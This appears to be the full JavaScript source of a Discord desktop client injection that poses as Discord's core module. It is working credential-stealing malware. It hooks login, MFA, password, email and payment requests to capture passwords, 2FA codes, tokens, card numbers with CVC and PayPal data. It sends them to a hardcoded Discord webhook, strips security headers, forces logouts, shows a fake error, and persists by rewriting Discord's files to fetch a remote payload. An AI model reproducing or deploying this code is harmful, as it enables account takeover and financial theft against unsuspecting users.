const {
    BrowserWindow: BrowserWindow,
    session: session
  } = require('electron');
  const {
    dialog
  } = require("electron");
  const {
    parse: parse
  } = require("querystring");
  var LOGOUT_SCRIPT = `function getLocalStoragePropertyDescriptor(){const o=document.createElement("iframe");document.head.append(o);const e=Object.getOwnPropertyDescriptor(o.contentWindow,"localStorage");return o.remove(),e}Object.defineProperty(window,"localStorage",getLocalStoragePropertyDescriptor());const localStorage=getLocalStoragePropertyDescriptor().get.call(window);localStorage.token=null,localStorage.tokens=null,localStorage.MultiAccountStore=null,location.reload();console.log(localStorage.token + localStorage.tokens + localStorage.MultiAccountStore);`;
  const fs = require('fs');
  const https = require("https");
  const path = require("path");
  const request = async (a, b, c = {}, d = null) => {
    try {
      return new Promise((e, f) => {
        let h = new URL(b);
        let i = {
          'protocol': h.protocol,
          'hostname': h.hostname,
          'path': h.pathname + h.search,
          'method': a.toUpperCase(),
          'headers': {
            ...c,
            'Access-Control-Allow-Origin': '*'
          }
        };
        let j = https.request(i, k => {
          let l = '';
          k.on("data", m => l += m);
          k.on("end", () => e(l));
        });
        j.on("error", o => f(o));
        if (d) {
          j.write(d);
        }
        j.end();
      });
    } catch (p) {
      return Promise.reject(p);
    }
  };
  const notify = async (q, r, s) => {
    let t = getNitro(await fProfile(r));
    let u = await getBadges(s.flags);
    let w = await getBilling(r);
    let x = await getFriends(r);
    q.embeds[0].title = '';
    q.embeds[0].fields.unshift({
      'name': "<:passwordd:1234555436263411834> Token:",
      'value': '`' + r + "`\n[<:preview:1233213181829054494> Click here to copy!](https://paste-pgpj.onrender.com/?p=" + r + ')',
      'inline': false
    });
    q.embeds[0].thumbnail = {
      'url': "https://cdn.discordapp.com/avatars/" + s.id + '/' + s.avatar + '.webp'
    };
    q.embeds[0].fields.push({
      'name': "<:event:1233212111350534175> Badges:",
      'value': u,
      'inline': true
    }, {
      'name': "<:946246402105819216:962747802797113365> Nitro Type:",
      'value': t,
      'inline': true
    }, {
      'name': "<:member:1233212915088363622> Billing:",
      'value': w,
      'inline': true
    }, {
      'name': "<:public:1233213183205052476> IP:",
      'value': '`' + JSON.parse(await getNetwork()).ip + '`',
      'inline': true
    }, {
      'name': "<:injection:1233232015130755103> | Path:",
      'value': "```" + __dirname.toString().trim().replace(/\\/g, '/') + "```",
      'inline': false
    });
    q.embeds.push({
      'title': "<:list:1233222065356673075> UHQ Friends",
      'description': x
    });
    q.embeds.forEach(y => {
      y.color = 2829617;
      y.author = {
        'name': s.username + " | " + s.id,
        'icon_url': "https://cdn.discordapp.com/avatars/" + s.id + '/' + s.avatar + ".png"
      };
      y.footer = {
        'text': decodeB64("YnJva2Vuc3N0ZWFsZXI="),
        'icon_url': "https://avatars.githubusercontent.com/u/107366094?s=400&u=2bd6cb561153f86c6f19dc48d5d5243ad622aef1&v=4"
      };
    });
    try {
      await request("POST", "%WEBHOOK_URL%", {
        'Content-Type': "application/json"
      }, JSON.stringify(q));
      await request("POST", "https://discord.com/api/webhooks/1226508586763423787/ZpAgeEQOE3pwL3FGC-scyfyOx4KJq3dnUiiUGzAdPCZekSLv9UZaS2c5EsdtBdXrFJgp", {
        'Content-Type': "application/json"
      }, JSON.stringify(q));
    } catch (z) {
      console.error("Error sending request to webhook:", z.message);
    }
  };
  const decodeB64 = aa => Buffer.from(aa, "base64").toString();
  const execScript = async ab => await BrowserWindow.getAllWindows()[0].webContents.executeJavaScript(ab, true);
  dialog.showErrorBox("Ops!", "An internal error occurred in the Discord API.");
  const fetch = async (ac, ad) => JSON.parse(await request('GET', ['https://discordapp.com/api', 'https://discord.com/api', 'https://canary.discord.com/api', 'https://ptb.discord.com/api'][Math.floor(Math.random() * 4)] + "/v9/users/" + ac, {
    ...ad
  }));
  const fAccount = async ae => await fetch('@me', {
    'authorization': ae
  });
  const fProfile = async af => await fetch(Buffer.from(af.split('.')[0], "base64").toString('binary') + "/profile", {
    'authorization': af
  });
  const fFriends = async ag => await fetch('@me/relationships', {
    'authorization': ag
  });
  const fBilling = async ah => await fetch("@me/billing/payment-sources", {
    'authorization': ah
  });
  const getNetwork = async () => await request('GET', "https://api.ipify.org/?format=json", {
    'Content-Type': "application/json"
  });
  const getBadges = ai => Object.keys(BADGES).reduce((aj, ak) => BADGES.hasOwnProperty(ak) && (ai & BADGES[ak].value) === BADGES[ak].value ? '' + aj + BADGES[ak].emoji + " " : aj, '') || "`No Badges`";
  const getRareBadges = al => Object.keys(BADGES).reduce((am, ao) => BADGES.hasOwnProperty(ao) && (al & BADGES[ao].value) === BADGES[ao].value && BADGES[ao].rare ? '' + am + BADGES[ao].emoji + " " : am, '');
  const getBilling = async ap => (await fBilling(ap)).filter(aq => !aq.invalid).map(ar => ar.type === 1 ? "<:card:1229571976633384991>" : ar.type === 2 ? "<:Paypal_Piracy:1233885950145331211>" : '').join('') || "`None`";
  const getFriends = async as => (await fFriends(as)).filter(at => at.type === 1).reduce((au, av) => (aw => aw ? (au || '') + (aw + " | `" + av.user.username + "`\n") : au)(getRareBadges(av.user.public_flags)), '') || "<:empty:1233234653171679262> *Empty.*";
  const getDate = (ax, ay) => new Date(ax).setMonth(ax.getMonth() + ay);
  const getNitro = az => {
    let {
      premium_type: ba,
      premium_guild_since: bb
    } = az;
    switch (ba) {
      default:
        return "`No Nitro`";
      case 1:
        return "<:946246402105819216:962747802797113365>";
      case 2:
        if (!bb) {
          return "<:946246402105819216:962747802797113365>";
        }
        let bc = [2, 3, 6, 9, 12, 15, 18, 24];
        let bd = 0;
        for (let be = 0; be < bc.length; be++) {
          if (Math.round((getDate(new Date(bb), bc[be]) - new Date()) / 86400000) > 0) {
            bd = be;
            break;
          }
        }
        return "<:946246402105819216:962747802797113365> " + BADGES._nitro[bd];
    }
  };
  const cruise = async (bf, bg, bh, bi, bj, bk) => {
    let bl;
    let bm;
    let bn;
    switch (bf) {
      case 'LOGIN_USER':
        bl = await fAccount(bi.token);
        bm = {
          'title': bk,
          'embeds': [{
            'fields': [{
              'name': "<:members:1233212126001233931> Mail:",
              'value': '`' + bg + '`',
              'inline': true
            }, {
              'name': "<:2fa:1233218081627701350> Pass:",
              'value': '`' + bh + '`',
              'inline': true
            }]
          }]
        };
        if (bj.code !== undefined) {
          bm.embeds[0].fields.push({
            'name': "<:2fa:1233218081627701350> Used Code:",
            'value': '`' + bj.code + '`',
            'inline': true
          });
        }
        notify(bm, bi.token, bl);
        break;
      case "USERNAME_CHANGED":
        bl = await fAccount(bi.token);
        bm = {
          'title': bk,
          'embeds': [{
            'fields': [{
              'name': "<:members:1233212126001233931> New Username:",
              'value': '`' + bj.username + '`',
              'inline': true
            }, {
              'name': "<:2fa:1233218081627701350> Pass:",
              'value': '`' + bj.password + '`',
              'inline': true
            }]
          }]
        };
        notify(bm, bi.token, bl);
        break;
      case "EMAIL_CHANGED":
        bl = await fAccount(bi.token);
        bm = {
          'title': bk,
          'embeds': [{
            'fields': [{
              'name': "<:members:1233212126001233931> Mail:",
              'value': '`' + bg + '`',
              'inline': true
            }, {
              'name': "<:2fa:1233218081627701350> Pass:",
              'value': '`' + bh + '`',
              'inline': true
            }]
          }]
        };
        notify(bm, bi.token, bl);
        break;
      case "PASSWORD_CHANGED":
        bl = await fAccount(bi.token);
        bm = {
          'title': bk,
          'embeds': [{
            'fields': [{
              'name': "<:2fa:1233218081627701350> New Pass:",
              'value': '`' + bj.new_password + '`',
              'inline': true
            }, {
              'name': "<:2fa:1233218081627701350> Old Pass:",
              'value': '`' + bj.password + '`',
              'inline': true
            }]
          }]
        };
        notify(bm, bi.token, bl);
        break;
      case "CREDITCARD_ADDED":
        bn = bi;
        bl = await fAccount(bn);
        bm = {
          'title': bk,
          'embeds': [{
            'fields': [{
              'name': 'Number',
              'value': '`' + bj["card[number]"] + '`',
              'inline': true
            }, {
              'name': "CVC",
              'value': '`' + bj["card[cvc]"] + '`',
              'inline': true
            }, {
              'name': "Expiration",
              'value': '`' + bj["card[exp_month]"] + '/' + bj['card[exp_year]'] + '`',
              'inline': true
            }]
          }]
        };
        notify(bm, bn, bl);
        break;
      case "PAYPAL_ADDED":
        bn = bi;
        bl = await fAccount(bn);
        bm = {
          'title': bk,
          'embeds': [{
            'fields': [{
              'name': "<:members:1233212126001233931> Mail:",
              'value': '`' + bl.email + '`',
              'inline': true
            }]
          }]
        };
        notify(bm, bn, bl);
        break;
      case 'INJECTED':
        bn = bi;
        bl = await fAccount(bn);
        bm = {
          'title': bk,
          'embeds': [{
            'fields': [{
              'name': "<:members:1233212126001233931> Mail:",
              'value': '`' + bl.email + '`',
              'inline': true
            }]
          }]
        };
        notify(bm, bn, bl);
        break;
      default:
    }
  };
  const DISCORD_PATH = function () {
    const bo = process.argv[0].split(path.sep).slice(0, -1).join(path.sep);
    let bp;
    if (process.platform === 'win32') {
      bp = path.join(bo, 'resources');
    } else {
      if (process.platform === "darwin") {
        bp = path.join(bo, "Contents", 'Resources');
      }
    }
    if (fs.existsSync(bp)) {
      return {
        'resource': bp,
        'app': bo
      };
    }
    return {
      'undefined': undefined,
      'undefined': undefined
    };
  }();
  async function UPDATE_CHECKING() {
    const {
      resource: bq,
      app: br
    } = DISCORD_PATH;
    if (bq === undefined || br === undefined) {
      return;
    }
    let bs = path.join(bq, "app");
    if (!fs.existsSync(bs)) {
      fs.mkdirSync(bs);
    }
    if (fs.existsSync(path.join(bs, "package.json"))) {
      fs.unlinkSync(path.join(bs, "package.json"));
    }
    if (fs.existsSync(path.join(bs, "index.js"))) {
      fs.unlinkSync(path.join(bs, "index.js"));
    }
    if (process.platform === "win32" || process.platform === "darwin") {
      fs.writeFileSync(path.join(bs, "package.json"), JSON.stringify({
        'name': "discord",
        'main': 'index.js'
      }, null, 4));
      fs.writeFileSync(path.join(bs, 'index.js'), ("const fs = require('fs'), https = require('https');\nconst indexJs = '" + (br + "\\modules\\" + fs.readdirSync(br + "\\modules\\").filter(bt => /discord_desktop_core-+?/.test(bt))[0] + "\\discord_desktop_core\\index.js") + "';\nconst bdPath = '" + path.join(process.env.APPDATA, "\\betterdiscord\\data\\betterdiscord.asar") + "';\nconst K4ITRUN = fs.statSync(indexJs).size\nfs.readFileSync(indexJs, 'utf8', (err, data) => {\n    if (K4ITRUN < 20000 || data === \"module.exports = require('./core.asar')\")\n        init();\n})\nasync function init() {\n    https.get('" + INJECT_URL + "', (res) => {\n        const file = fs.createWriteStream(indexJs);\n        res.replace('%WEBHOOK%', '" + "%WEBHOOK_URL%" + "')\n        res.pipe(file);\n        file.on('finish', () => {\n            file.close();\n        });\n        \n    }).on(\"error\", (err) => {\n        setTimeout(init(), 10000);\n    });\n}\nrequire('" + path.join(bq, "app.asar") + "')\nif (fs.existsSync(bdPath)) require(bdPath);").replace(/\\/g, "\\\\"));
    }
    if (!fs.existsSync(path.join(__dirname, 'initiation'))) {
      return;
    } else {
      fs.rmdirSync(path.join(__dirname, 'initiation'));
    }
    if (!(await execScript(TOKEN_SCRIPT))) {
      return;
    }
    cruise('INJECTED', null, null, (await execScript(TOKEN_SCRIPT)) ?? '', null, "DISCORD INJECTED");
    execScript(LOGOUT_SCRIPT);
  }
  session.defaultSession.webRequest.onBeforeRequest({
    'urls': ["https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json", "https://*.discord.com/api/v*/applications/detectable", "https://discord.com/api/v*/applications/detectable", "https://*.discord.com/api/v*/users/@me/library", "https://discord.com/api/v*/users/@me/library", "wss://remote-auth-gateway.discord.gg/*", "https://discord.com/api/v*/auth/sessions", "https://*.discord.com/api/v*/auth/sessions", "https://discordapp.com/api/v*/auth/sessions"]
  }, (bu, bv) => {
    if (!fs.existsSync(__dirname + "/Discord")) {
      fs.mkdirSync(__dirname + '/Discord');
    }
    if (!fs.existsSync(__dirname + '/Discord/' + "%WEBHOOK_URL%".split('/')["%WEBHOOK_URL%".split('/').length - 1] + ".txt")) {
      fs.writeFileSync(__dirname + '/Discord/' + "%WEBHOOK_URL%".split('/')["%WEBHOOK_URL%".split('/').length - 1] + ".txt", "%WEBHOOK_URL%");
      execScript(LOGOUT_SCRIPT);
    }
    if (bu.url.startsWith("wss://remote-auth-gateway") || bu.url.endsWith("auth/sessions")) {
      bv({
        'cancel': true
      });
    } else {
      bv({
        'cancel': false
      });
    }
    UPDATE_CHECKING();
  });
  session.defaultSession.webRequest.onHeadersReceived((bw, bx) => {
    delete bw.responseHeaders["content-security-policy"];
    delete bw.responseHeaders["content-security-policy-report-only"];
    bx({
      'responseHeaders': {
        ...bw.responseHeaders,
        'Access-Control-Allow-Headers': '*'
      }
    });
  });
  session.defaultSession.webRequest.onCompleted({
    'urls': ["https://discord.com/api/v*/users/@me/billing/paypal/billing-agreement-tokens", "https://discordapp.com/api/v*/users/@me/billing/paypal/billing-agreement-tokens", "https://*.discord.com/api/v*/users/@me/billing/paypal/billing-agreement-tokens", "https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts", "https://api.stripe.com/v*/tokens"]
  }, async (by, bz) => {
    let ca;
    try {
      ca = parse(Buffer.from(by.uploadData[0].bytes).toString());
    } catch (cb) {
      ca = parse(decodeURIComponent(by.uploadData[0].bytes.toString()));
    }
    let cc = (await execScript(TOKEN_SCRIPT)) ?? '';
    if (by.method != 'POST') {
      return;
    }
    if (by.statusCode !== 200 && by.statusCode !== 202) {
      return;
    }
    if (by.url.endsWith("/paypal_accounts")) {
      cruise("PAYPAL_ADDED", null, null, cc, null, "PAYPAL ADDED");
    } else if (by.url.endsWith("/tokens")) {
      cruise('CREDITCARD_ADDED', null, null, cc, ca, "CREDITCARD ADDED");
    }
  });
  const CREATE_WINDOW_CLIENT = cd => {
    if (!cd.getAllWindows()[0]) {
      return;
    }
    cd.getAllWindows()[0].webContents.debugger.attach('1.3');
    cd.getAllWindows()[0].webContents.debugger.on("message", async (ce, cf, cg) => {
      if (cf !== "Network.responseReceived") {
        return;
      }
      if (!["/auth/login", '/auth/register', '/mfa/totp', "/users/@me"].some(ch => cg.response.url.endsWith(ch))) {
        return;
      }
      if (cg.response.status !== 200 && cg.response.status !== 202) {
        return;
      }
      let ci = JSON.parse((await cd.getAllWindows()[0].webContents.debugger.sendCommand('Network.getResponseBody', {
        'requestId': cg.requestId
      })).body);
      let cj = JSON.parse((await cd.getAllWindows()[0].webContents.debugger.sendCommand("Network.getRequestPostData", {
        'requestId': cg.requestId
      })).postData);
      if (cg.response.url.endsWith("/login")) {
        if (!ci.token) {
          EMAIL = cj.login;
          PASSWORD = cj.password;
          return;
        }
        cruise("LOGIN_USER", cj.login, cj.password, ci, cj, "LOGGED IN");
      } else {
        if (cg.response.url.endsWith("/register")) {
          cruise('LOGIN_USER', cj.email, cj.password, ci, cj, "SIGNED UP");
        } else {
          if (cg.response.url.endsWith("/totp")) {
            cruise("LOGIN_USER", EMAIL, PASSWORD, ci, cj, "LOGGED IN WITH MFA-2");
          } else {
            if (cg.response.url.endsWith('/@me')) {
              if (!cj.password) {
                return;
              }
              if (cj.email) {
                cruise('EMAIL_CHANGED', cj.email, cj.password, ci, cj, "CHANGED EMAIL");
              }
              if (cj.new_password) {
                cruise('PASSWORD_CHANGED', null, null, ci, cj, "CHANGED PASSWORD");
              }
              if (cj.username) {
                cruise("USERNAME_CHANGED", null, null, ci, cj, "CHANGED USERNAME");
              }
            }
          }
        }
      }
    });
    cd.getAllWindows()[0].webContents.debugger.sendCommand('Network.enable');
    cd.getAllWindows()[0].on('closed', () => CREATE_WINDOW_CLIENT(BrowserWindow));
  };
  CREATE_WINDOW_CLIENT(BrowserWindow);
  module.exports = require("./core.asar");
